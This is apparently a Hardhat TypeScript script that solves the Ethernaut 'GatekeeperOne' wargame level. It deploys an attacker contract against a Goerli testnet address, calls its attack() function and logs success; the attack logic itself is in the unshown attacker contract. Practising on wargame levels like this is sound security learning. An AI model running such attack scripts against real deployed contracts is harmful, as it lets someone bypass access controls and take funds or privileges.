import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "GatekeeperOne"
const CONTRACT_ADDRESS = "0x6479268D97BE9a65D72AC5246d756E6265D47EdD"
const CONTRACT_NAME_ATTACKER = "GatekeeperOneAttacker"

async function main() {
    const GatekeeperOneAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const gatekeeperAttacker = await GatekeeperOneAttacker.connect(attacker).deploy(CONTRACT_ADDRESS)
    await gatekeeperAttacker.deployed()

    const tx: TransactionResponse = await gatekeeperAttacker.connect(attacker).attack()
    await tx.wait()

    console.log("GatekeeperOne: pasted the gatekeeper and registered as an entrant");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });